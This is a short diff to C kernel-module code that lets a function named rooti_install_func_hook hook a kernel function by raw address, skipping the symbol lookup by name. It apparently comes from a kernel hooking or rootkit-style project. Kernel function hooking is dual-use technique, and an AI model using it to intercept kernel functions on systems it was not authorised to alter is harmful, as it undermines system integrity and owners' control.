@@ -41,10 +41,14 @@ int rooti_install_func_hook(struct rooti_func_hook *hook)
 {
     int err;
 
-    hook->addr = __kallsyms_lookup_name(hook->name);
-    if (hook->addr == 0) {
-        ROOTI_DEBUG("unresolved symbol: %s", hook->name);
-        return -ENOENT;
+    // Hooking by address directly instead of looking up symbol
+    // by name is possible by passing null as the symbol name
+    if (hook->name != NULL) {
+        hook->addr = __kallsyms_lookup_name(hook->name);
+        if (hook->addr == 0) {
+            ROOTI_DEBUG("unresolved symbol: %s", hook->name);
+            return -ENOENT;
+        }
     }
 
     rooti_store_original_func(hook);
